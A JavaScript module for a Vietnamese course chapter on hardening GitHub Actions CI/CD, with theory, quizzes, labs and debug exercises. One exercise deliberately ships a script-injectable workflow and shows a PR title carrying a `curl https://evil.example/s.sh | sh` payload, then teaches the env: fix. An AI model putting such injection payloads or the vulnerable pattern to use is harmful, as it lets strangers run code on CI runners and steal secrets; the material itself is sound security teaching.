(function (G) {
'use strict';
/* Chương ci4: CI/CD nâng cao: reusable workflow, composite action, bảo mật, vận hành. */
var C = G.COURSE, L = C.L, OK = C.OK, ftxt = C.ftxt, CI = C.CI, GH = C.GH;
var WF = '.github/workflows/';
function hasRun(s, ev) { return CI.st(s).runs.some(function (r) { return r.event === ev; }); }
function headDoc(s, path) { var t = CI.R(s).head[path]; if (t == null) return null; var P = GH.yparse(t); return P.errs.length ? null : P.doc; }
function fileDoc(s, rel) { var t = ftxt(s, CI.proj(s) + '/' + rel); if (!t) return null; var P = GH.yparse(t); return P.errs.length ? null : P.doc; }
var REUSABLE = ['name: Test (reusable)', 'on:', '  workflow_call:', '    inputs:', '      node-version:', '        type: string', "        default: '22'", 'jobs:', '  test:', '    runs-on: ubuntu-latest', '    steps:', '      - uses: actions/checkout@v4', '      - uses: actions/setup-node@v4', '        with:', '          node-version: ${{ inputs.node-version }}', '          cache: npm', '      - run: npm ci', '      - run: npm test'];
var CALLER = ['name: CI', 'on:', '  push:', '    branches: [main]', '  pull_request:', 'permissions:', '  contents: read', 'concurrency:', '  group: ci-${{ github.ref }}', '  cancel-in-progress: true', 'jobs:', '  test:', '    uses: ./.github/workflows/test.yml', '    with:', "      node-version: '22'"];
var COMPOSITE = ['name: Setup app', 'description: Cài Node và thư viện của dự án', 'runs:', '  using: composite', '  steps:', '    - uses: actions/setup-node@v4', '      with:', '        node-version: 22', '        cache: npm', '    - run: npm ci', '      shell: bash'];
var LINT = ['name: Lint', 'on: [pull_request]', 'permissions:', '  contents: read', 'jobs:', '  lint:', '    runs-on: ubuntu-latest', '    timeout-minutes: 10', '    steps:', '      - uses: actions/checkout@v4', '      - uses: ./.github/actions/setup-app', '      - run: npm run lint --if-present'];
var DEPENDABOT = ['version: 2', 'updates:', '  - package-ecosystem: github-actions', '    directory: /', '    schedule:', '      interval: weekly', '  - package-ecosystem: npm', '    directory: /', '    schedule:', '      interval: weekly'];
var OWNERS = ['* @haidangphan1506', '/.github/workflows/ @haidangphan1506'];
var INJECT = ['name: PR title', 'on:', '  pull_request:', 'jobs:', '  show:', '    runs-on: ubuntu-latest', '    steps:', '      - run: echo "Tiêu đề: ${{ github.event.pull_request.title }}"'];
var INJECT_OK = ['name: PR title', 'on:', '  pull_request:', 'jobs:', '  show:', '    runs-on: ubuntu-latest', '    steps:', '      - env:', '          TITLE: ${{ github.event.pull_request.title }}', '        run: echo "Tiêu đề: $TITLE"'];
function ciYml(o) {
  var out = ['name: CI', 'on:', '  push:', '    branches: [main]', '  pull_request:'];
  if (o.perm) out.push(o.perm);
  if (o.conc) out = out.concat(['concurrency:', '  group: ci-${{ github.ref }}', '  cancel-in-progress: true']);
  return out.concat(['jobs:', '  test:', '    runs-on: ubuntu-latest', '    steps:', '      - uses: actions/checkout@v4', '      - uses: actions/setup-node@v4', '        with:', '          node-version: 22', '      - run: npm ci', '      - run: npm test']);
}

var T = {
  id: 'ci4', group: CI.GROUP, short: 'Nâng cao: tái sử dụng và bảo mật',
  title: 'CI/CD nâng cao: tái sử dụng, bảo mật và vận hành',
  dek: 'Reusable workflow và composite action, quyền tối thiểu cho GITHUB_TOKEN, ghim phiên bản, chống script injection, concurrency, timeout, Dependabot, CODEOWNERS, OIDC và checklist pipeline production.'
};
C.lessons.push(T);

T.theory = [
  { tag: 'Tái sử dụng', title: 'Reusable workflow và composite action', body: [
    'Khi nhiều workflow lặp lại cùng một chuỗi bước (checkout, cài Node, `npm ci`), hãy gom lại một chỗ. Có hai cách, ở hai tầng khác nhau:',
    { tbl: [['', 'Reusable workflow', 'Composite action'], ['Gom cái gì', 'Cả **job** (hoặc nhiều job)', 'Nhiều **step** thành một step'], ['Khai báo', '`on: workflow_call` trong file ở `.github/workflows/`', '`runs: using: composite` trong `action.yml`'], ['Cách gọi', 'Ở cấp job: `uses: ./.github/workflows/test.yml`', 'Ở cấp step: `uses: ./.github/actions/setup-app`'], ['Tham số', '`inputs` và `secrets` (hoặc `secrets: inherit`)', '`inputs`; mọi step `run` phải ghi rõ `shell: bash`'], ['Dùng khi', 'Cùng một quy trình test/deploy cho nhiều repo hay nhiều nhánh', 'Cùng một cụm bước lặp lại trong nhiều job']] },
    { pre: ['# test.yml (reusable)', 'on:', '  workflow_call:', '    inputs:', '      node-version:', '        type: string', "        default: '22'", '', '# ci.yml (bên gọi)', 'jobs:', '  test:', '    uses: ./.github/workflows/test.yml', '    with:', "      node-version: '24'"], cap: 'Một workflow tái sử dụng và nơi gọi nó' },
    { note: 'Job gọi reusable workflow **không có `runs-on` và `steps`**: chúng nằm trong workflow được gọi. Workflow gọi sang repo khác dùng dạng `owner/repo/.github/workflows/test.yml@v1`.', kind: 'tip' }
  ] },
  { tag: 'Bảo mật', title: 'Làm cứng pipeline: quyền, phiên bản, injection', body: [
    { tbl: [['Rủi ro', 'Cách phòng'], ['`GITHUB_TOKEN` có quyền ghi mặc định rộng', 'Khai báo `permissions: contents: read` ở đầu file, chỉ nâng quyền cho job cần (`packages: write`, `id-token: write`)'], ['Action bên thứ ba bị chiếm tag (`@v1` bị trỏ sang mã độc)', 'Ghim theo **commit SHA đầy đủ** (40 ký tự) kèm chú thích phiên bản; để Dependabot cập nhật'], ['**Script injection**: chèn ${{ github.event.pull_request.title }} thẳng vào `run:`', 'Đưa giá trị vào biến môi trường (`env:`) rồi dùng `"$TITLE"` trong script'], ['`pull_request_target` chạy với secrets của repo gốc', 'Không checkout và chạy code của PR từ fork trong workflow này; tách thành hai workflow'], ['Khoá dài hạn cho cloud nằm trong secrets', 'Dùng **OIDC**: `permissions: id-token: write`, cloud cấp token ngắn hạn cho đúng workflow'], ['Ai cũng sửa được workflow rồi tự duyệt', '`CODEOWNERS` cho `.github/workflows/` và branch protection bắt buộc review']] },
    { pre: ['permissions:', '  contents: read', '', 'steps:', '  - env:', '      TITLE: ${{ github.event.pull_request.title }}', '    run: echo "Tiêu đề: $TITLE"      # an toàn: không dán vào script'], cap: 'Quyền tối thiểu và cách đưa dữ liệu ngoài vào shell' },
    { note: 'Mọi thứ do người ngoài kiểm soát (tiêu đề PR, tên nhánh, nội dung issue, commit message) đều là **dữ liệu không tin cậy**. Đừng bao giờ để nó nằm trong `run:` qua ${{ }}.', kind: 'warn' }
  ] },
  { tag: 'Vận hành', title: 'Concurrency, timeout, Dependabot, runner và phát hành', body: [
    { tbl: [['Việc', 'Cấu hình', 'Lợi ích'], ['Huỷ lần chạy cũ khi push tiếp', '`concurrency: group: ci-${{ github.ref }}, cancel-in-progress: true`', 'Tiết kiệm phút chạy, kết quả luôn là của commit mới nhất'], ['Chặn job treo', '`timeout-minutes: 10` ở cấp job', 'Mặc định là 360 phút: một job treo ngốn hết hạn mức'], ['Tự cập nhật action và thư viện', '`.github/dependabot.yml` với `github-actions` và `npm`', 'PR nâng phiên bản mở tự động, CI kiểm tra giúp bạn'], ['Giữ kết quả có thời hạn', '`retention-days` của artifact', 'Đỡ tốn dung lượng lưu trữ'], ['Phát hành bản có ghi chú', '`gh release create v1.1.0 --generate-notes`', 'Tạo tag và release; tag kích hoạt workflow `on: push: tags`'], ['Runner riêng (self-hosted)', 'Cài runner trên máy bạn, `runs-on: self-hosted`', 'Nhanh, có thể truy cập mạng nội bộ; **không dùng cho repo công khai**, vì ai mở PR cũng chạy được code trên máy bạn']] },
    { note: 'Schedule và workflow chạy dài đều tốn phút. Repo công khai chạy miễn phí trên runner của GitHub; repo riêng có hạn mức phút mỗi tháng tuỳ gói.', kind: 'tip' }
  ] },
  { tag: 'Checklist', title: 'Checklist pipeline sẵn sàng cho production', body: [
    { tbl: [['Hạng mục', 'Đạt khi'], ['Cú pháp', '`actionlint` sạch lỗi, chạy được ở máy và trong CI'], ['Quyền', '`permissions` khai báo tối thiểu; job deploy không dùng `write-all`'], ['Phiên bản', 'Mọi action ghi rõ phiên bản; bên thứ ba ghim SHA; có Dependabot'], ['Dữ liệu ngoài', 'Không có ${{ github.event.* }} trong `run:`; dùng `env:`'], ['Chi phí', '`concurrency`, `timeout-minutes`, cache bật'], ['Triển khai', 'Deploy `needs: test`, có environment, kiểm tra sức khoẻ và cách rollback'], ['Bảo vệ nhánh', 'Branch protection: bắt buộc CI xanh và review; `CODEOWNERS` cho thư mục workflow'], ['Bí mật', 'Secrets theo environment; ưu tiên OIDC; khoá riêng deploy có thể thu hồi']] }
  ] }
];

T.quiz = C.QZ(0, [
  ['Muốn nhiều workflow dùng chung một quy trình test, bạn nên dùng gì?', 'Reusable workflow: file có `on: workflow_call`, workflow khác gọi bằng `uses` ở cấp job', ['Copy file `ci.yml` sang mọi chỗ', 'Đặt `needs` giữa các repo', 'Dùng `schedule` để đồng bộ'], 'Một nơi định nghĩa, nhiều nơi gọi: sửa một lần là mọi nơi được cập nhật.'],
  ['Composite action khác reusable workflow ở điểm nào?', 'Composite gom nhiều **step** thành một step; reusable workflow gom cả **job**', ['Composite chạy trên runner riêng', 'Composite chỉ dùng được cho Docker', 'Hai thứ hoàn toàn giống nhau'], 'Trong composite action, mỗi step `run` phải khai báo `shell` (ví dụ `shell: bash`).'],
  ['`permissions: contents: read` ở đầu workflow để làm gì?', 'Thu hẹp quyền của `GITHUB_TOKEN` xuống mức tối thiểu cần thiết', ['Cho phép ghi vào repo', 'Tắt `GITHUB_TOKEN` hoàn toàn', 'Cấp quyền đọc secrets'], 'Nếu một action bên thứ ba bị chiếm quyền, thiệt hại bị giới hạn bởi quyền của token. Chỉ nâng quyền ở job thật sự cần.'],
  ['Vì sao nên ghim action bên thứ ba theo commit SHA đầy đủ thay vì tag như `@v1`?', 'Tag có thể bị di chuyển sang mã khác (kể cả mã độc); SHA thì bất biến', ['SHA chạy nhanh hơn tag', 'GitHub bắt buộc dùng SHA', 'Tag không hỗ trợ cache'], 'Kiểu tấn công chuỗi cung ứng nhắm vào các action phổ biến đã từng xảy ra. Dependabot có thể tự nâng SHA khi có bản mới.'],
  ['Chèn trực tiếp ${{ github.event.pull_request.title }} vào `run:` nguy hiểm vì sao?', 'Giá trị do người ngoài kiểm soát bị dán thẳng vào script shell, cho phép chèn lệnh (script injection)', ['Vì tiêu đề có thể quá dài', 'Vì GitHub tính thêm phí', 'Vì biểu thức không chạy được trong `run`'], 'Hãy đưa giá trị qua `env:` và dùng `"$TITLE"`. Khi đó nó chỉ là dữ liệu, không bao giờ được shell diễn giải như lệnh.'],
  ['`pull_request_target` nguy hiểm khi nào?', 'Khi nó chạy với quyền và secrets của repo gốc mà lại checkout và chạy code của PR từ fork', ['Khi PR chưa được duyệt', 'Khi repo là công khai', 'Khi workflow có hơn một job'], 'Đây là lý do nhiều vụ rò rỉ secrets. Tách thành hai workflow: một chạy code PR không secrets, một chạy bước cần quyền.'],
  ['`concurrency: group: ci-${{ github.ref }}, cancel-in-progress: true` cho CI có nghĩa gì?', 'Push mới vào cùng nhánh thì huỷ lần chạy cũ đang dở, tiết kiệm phút chạy', ['Chỉ cho phép một nhánh chạy CI', 'Chạy mọi lần push song song', 'Giới hạn số secret'], 'Với CI nên bật huỷ lần cũ. Với deploy production thì ngược lại: `cancel-in-progress: false` để không bỏ dở giữa chừng.'],
  ['OIDC giúp gì khi deploy lên dịch vụ cloud?', 'Workflow xin token ngắn hạn từ GitHub để đăng nhập cloud, khỏi cất khoá dài hạn trong secrets', ['Mã hoá file workflow', 'Tăng tốc build', 'Cho phép chạy workflow không cần runner'], 'Cần `permissions: id-token: write` và cấu hình tin cậy phía cloud theo repo, nhánh hoặc environment.'],
  ['Dependabot với `package-ecosystem: github-actions` làm gì?', 'Tự mở pull request nâng phiên bản các action mà workflow đang dùng', ['Tự merge mọi thay đổi', 'Chạy workflow mỗi tuần', 'Xoá action không dùng'], 'Kết hợp với ghim SHA, bạn vừa an toàn vừa không phải nhớ theo dõi bản mới.'],
  ['Vì sao không nên dùng self-hosted runner cho repo công khai?', 'Ai mở được pull request đều có thể chạy code trên máy của bạn', ['Vì self-hosted runner không hỗ trợ Linux', 'Vì chậm hơn runner của GitHub', 'Vì không đọc được secrets'], 'Runner riêng chạy thẳng trên máy bạn, có thể chạm tới mạng nội bộ. Chỉ dùng cho repo riêng tư, hoặc cho runner tạm dùng một lần (ephemeral).']
]);

T.lab = {
  host: 'vps', user: 'haidangphan',
  setup: function (s) { CI.repo(s); },
  items: [
    { text: 'Tạo reusable workflow `test.yml`: `on: workflow_call` với input `node-version` (mặc định 22), chạy checkout, setup-node có cache, `npm ci`, `npm test`.', hint: C.HCU(WF + 'test.yml', REUSABLE), check: function (s) { var d = CI.doc(s, 'test.yml'); return !!d && CI.onKeys(d).indexOf('workflow_call') >= 0 && !!d.on.workflow_call.inputs && !!d.on.workflow_call.inputs['node-version'] && CI.runs(CI.job(s, 'test.yml', 'test'), /npm test/); } },
    { text: 'Viết lại `ci.yml` thành bên gọi: job `test` dùng `uses: ./.github/workflows/test.yml`, thêm `permissions: contents: read` và `concurrency` có `cancel-in-progress: true`.', hint: C.HCU(WF + 'ci.yml', CALLER), check: function (s) { var d = CI.doc(s, 'ci.yml'), j = CI.job(s, 'ci.yml', 'test'); return !!d && !!j && j.uses === './.github/workflows/test.yml' && !!d.permissions && d.permissions.contents === 'read' && !!d.concurrency && String(d.concurrency['cancel-in-progress']) === 'true'; } },
    { text: 'Tạo thư mục cho composite action: `mkdir -p .github/actions/setup-app`.', hint: 'mkdir -p .github/actions/setup-app', check: function (s) { return s.fs.isD(CI.proj(s) + '/.github/actions/setup-app'); } },
    { text: 'Viết composite action `.github/actions/setup-app/action.yml`: cài Node (cache npm) rồi `npm ci` với `shell: bash`.', hint: C.HCU('.github/actions/setup-app/action.yml', COMPOSITE), check: function (s) { var d = fileDoc(s, '.github/actions/setup-app/action.yml'); return !!d && !!d.runs && d.runs.using === 'composite' && Array.isArray(d.runs.steps) && d.runs.steps.some(function (st) { return st.shell === 'bash'; }); } },
    { text: 'Tạo `lint.yml` dùng composite action vừa viết (`uses: ./.github/actions/setup-app`), có `timeout-minutes: 10` và `permissions: contents: read`.', hint: C.HCU(WF + 'lint.yml', LINT), check: function (s) { var j = CI.job(s, 'lint.yml', 'lint'), d = CI.doc(s, 'lint.yml'); return !!j && String(j['timeout-minutes']) === '10' && CI.uses(j, /^\.\/\.github\/actions\/setup-app$/) && !!d.permissions; } },
    { text: 'Tạo `.github/dependabot.yml`: cập nhật hằng tuần cho `github-actions` và `npm`.', hint: C.HCU('.github/dependabot.yml', DEPENDABOT), check: function (s) { var d = fileDoc(s, '.github/dependabot.yml'); return !!d && String(d.version) === '2' && Array.isArray(d.updates) && d.updates.some(function (u) { return u['package-ecosystem'] === 'github-actions' && u.schedule && u.schedule.interval === 'weekly'; }) && d.updates.some(function (u) { return u['package-ecosystem'] === 'npm'; }); } },
    { text: 'Tạo `.github/CODEOWNERS`: bạn là chủ của mọi file, kể cả `/.github/workflows/`.', hint: C.HCU('.github/CODEOWNERS', OWNERS), check: function (s) { var t = ftxt(s, CI.proj(s) + '/.github/CODEOWNERS'); return /^\* @haidangphan1506$/m.test(t) && /^\/\.github\/workflows\/ @haidangphan1506$/m.test(t); } },
    { text: 'Kiểm tra mọi workflow bằng `actionlint`.', hint: 'actionlint', check: function (s) { return OK(/^actionlint$/)(s) && CI.lint(s, 'ci.yml') && CI.lint(s, 'test.yml') && CI.lint(s, 'lint.yml'); } },
    { text: 'Kiểm kê các action đang dùng bằng `grep -rn "uses:" .github/workflows` (nên ghim SHA cho bên thứ ba).', hint: 'grep -rn "uses:" .github/workflows', check: OK(/^grep -rn uses: \.github\/workflows\/?$/) },
    { text: 'Tạo nhánh `chore/ci-hardening` bằng `git switch -c`.', hint: 'git switch -c chore/ci-hardening', check: function (s) { return CI.R(s).branch === 'chore/ci-hardening'; } },
    { text: 'Thêm và commit: `Làm cứng CI: reusable, composite, dependabot`.', hint: 'git add .\ngit commit -m "Làm cứng CI: reusable, composite, dependabot"', check: function (s) { return CI.R(s).commits.length >= 2 && CI.headHas(s, WF + 'test.yml', /workflow_call/) && CI.headHas(s, '.github/dependabot.yml', /github-actions/); } },
    { text: 'Đẩy nhánh lên GitHub: `git push -u origin chore/ci-hardening`.', hint: 'git push -u origin chore/ci-hardening', check: function (s) { return !!CI.R(s).pushed['chore/ci-hardening']; } },
    { text: 'Mở pull request `gh pr create --title "Làm cứng CI"`: ci.yml và lint.yml chạy với sự kiện pull_request.', hint: 'gh pr create --title "Làm cứng CI"', check: function (s) { return CI.st(s).prs.length >= 1 && hasRun(s, 'pull_request'); } },
    { text: 'Xem kết quả kiểm tra của PR bằng `gh pr checks`.', hint: 'gh pr checks', check: OK(/^gh pr checks/) },
    { text: 'Xem các lần chạy bằng `gh run list`: có lần chạy với sự kiện `pull_request`.', hint: 'gh run list', check: function (s) { return OK(/^gh run list/)(s) && hasRun(s, 'pull_request'); } },
    { text: 'Quay về main bằng `git switch main`.', hint: 'git switch main', check: function (s) { return CI.R(s).branch === 'main' && OK(/^git switch main$/)(s); } },
    { text: 'Phát hành bản `v1.1.0` có ghi chú tự sinh: `gh release create v1.1.0 --generate-notes`.', hint: 'gh release create v1.1.0 --generate-notes', check: function (s) { return CI.R(s).pushedTags.indexOf('v1.1.0') >= 0; } }
  ]
};

T.debugs = [
  {
    id: 'ci4d1', title: 'Script injection qua tiêu đề pull request',
    host: 'vps', user: 'haidangphan',
    symptom: L('$ cat .github/workflows/pr-title.yml', '      - run: echo "Tiêu đề: ${{ github.event.pull_request.title }}"', '$ # một PR tên:  x"; curl https://evil.example/s.sh | sh; echo "', '→ runner thực thi lệnh curl | sh bên trong bước echo'),
    story: 'Workflow in tiêu đề PR ra log. Một người lạ mở PR với tiêu đề chứa dấu nháy và lệnh shell, và runner chạy luôn lệnh đó vì giá trị bị dán thẳng vào script.',
    goal: 'Giá trị tiêu đề PR đi qua biến môi trường `TITLE`; bước `run` không còn chứa ${{ }}. Thay đổi đã được commit và push.',
    hints: ['Mở `pr-title.yml`: biểu thức ${{ ... }} được GitHub thay vào `run:` **trước** khi shell chạy.', 'Dữ liệu từ người ngoài phải đi qua `env:` rồi dùng biến shell, như vậy nó chỉ là chuỗi.', 'Dùng `env: TITLE: ${{ ... }}` và `run: echo "...$TITLE"`, commit và push.'],
    fix: [C.HCU(WF + 'pr-title.yml', INJECT_OK), 'actionlint', 'git add .', 'git commit -m "Chống script injection"', 'git push'],
    cause: 'Biểu thức ${{ }} được thay thành văn bản **trước khi** script chạy, nên nội dung kẻ tấn công kiểm soát trở thành một phần của lệnh. Với `env:`, giá trị là dữ liệu nằm trong biến, shell không diễn giải nó như mã.',
    setup: function (s) { CI.repo(s, { yml: INJECT, file: 'pr-title.yml' }); },
    check: function (s) { var d = headDoc(s, WF + 'pr-title.yml'); var st = d && d.jobs && d.jobs.show && d.jobs.show.steps && d.jobs.show.steps[0]; return !!st && !!st.env && /github\.event\.pull_request\.title/.test(String(st.env.TITLE)) && typeof st.run === 'string' && st.run.indexOf('${{') < 0 && /\$TITLE/.test(st.run); }
  },
  {
    id: 'ci4d2', title: 'GITHUB_TOKEN có quyền ghi quá rộng',
    host: 'vps', user: 'haidangphan',
    symptom: L('$ grep -n permissions .github/workflows/ci.yml', '5:permissions: write-all', '→ mọi step, kể cả action bên thứ ba, nhận token có quyền ghi vào code, issue, package...'),
    story: 'Workflow CI chỉ cần đọc code để test, nhưng ai đó đặt `permissions: write-all` cho tiện. Nếu một action bên thứ ba bị chiếm quyền, nó có thể ghi vào repo của bạn.',
    goal: '`ci.yml` chỉ còn `permissions: contents: read` (không còn `write-all`), đã commit và push, lần chạy mới nhất thành công.',
    hints: ['Tìm dòng `permissions` ở đầu `ci.yml`.', 'CI chỉ cần đọc mã nguồn nên `contents: read` là đủ.', 'Thay `write-all` bằng khối `permissions:` có `contents: read`, `actionlint`, commit, push.'],
    fix: [C.HCU(WF + 'ci.yml', ciYml({ perm: 'permissions:\n  contents: read' })), 'actionlint', 'git add .', 'git commit -m "Thu hẹp quyền GITHUB_TOKEN"', 'git push'],
    cause: 'Quyền của `GITHUB_TOKEN` nên theo nguyên tắc tối thiểu. `write-all` mở rộng thiệt hại khi bất kỳ step nào bị khai thác. Khai báo `contents: read` ở đầu file, chỉ nâng quyền ở đúng job cần.',
    setup: function (s) { CI.repo(s, { yml: ciYml({ perm: 'permissions: write-all' }) }); },
    check: function (s) { var d = headDoc(s, WF + 'ci.yml'); return !!d && !!d.permissions && typeof d.permissions === 'object' && d.permissions.contents === 'read' && CI.greenLast(s) && CI.runCount(s) >= 2; }
  },
  {
    id: 'ci4d3', title: 'Push liên tiếp, nhiều lần chạy chồng nhau',
    host: 'vps', user: 'haidangphan',
    symptom: L('$ gh run list', 'X\tsửa lỗi chính tả\tCI\tmain\tpush\t9104\t...', '✓\tsửa lần 2\tCI\tmain\tpush\t9103\t...', '✓\tsửa lần 1\tCI\tmain\tpush\t9102\t...', '→ ba lần chạy cho ba commit liên tiếp, lần cũ vẫn chạy dù đã có commit mới hơn'),
    story: 'Bạn push sửa lỗi nhiều lần trong vài phút. Mỗi lần push đều chạy đầy đủ CI, các lần chạy cũ vẫn tiếp tục dù kết quả của chúng không còn ý nghĩa, ngốn phút chạy.',
    goal: '`ci.yml` có `concurrency` nhóm theo nhánh với `cancel-in-progress: true`, đã commit, push và lần chạy mới nhất thành công.',
    hints: ['Workflow chưa có khoá `concurrency` nên mọi lần chạy độc lập nhau.', 'Nhóm theo nhánh: `group: ci-${{ github.ref }}`; lần chạy mới sẽ thay thế lần cũ nếu `cancel-in-progress: true`.', 'Thêm khối `concurrency:` ở cấp workflow, `actionlint`, commit và push.'],
    fix: [C.HCU(WF + 'ci.yml', ciYml({ conc: true })), 'actionlint', 'git add .', 'git commit -m "Huỷ lần chạy cũ khi có commit mới"', 'git push'],
    cause: '`concurrency` gom các lần chạy cùng `group` vào một hàng. `cancel-in-progress: true` huỷ lần đang chạy dở khi lần mới tới, phù hợp với CI. Với deploy production hãy đặt `false` để không bỏ dở giữa chừng.',
    setup: function (s) { CI.repo(s, { yml: ciYml({}), after: ["sed -i 's#\"version\": \"1.4.2\"#\"version\": \"1.4.3\"#' package.json", 'git commit -am "sửa lần 1"', 'git push', "sed -i 's#\"version\": \"1.4.3\"#\"version\": \"1.4.4\"#' package.json", 'git commit -am "sửa lần 2"', 'git push'] }); },
    check: function (s) { var d = headDoc(s, WF + 'ci.yml'); return !!d && !!d.concurrency && String(d.concurrency['cancel-in-progress']) === 'true' && /github\.ref/.test(String(d.concurrency.group)) && CI.greenLast(s); }
  }
];
})(typeof globalThis !== 'undefined' ? globalThis : this);
export {};
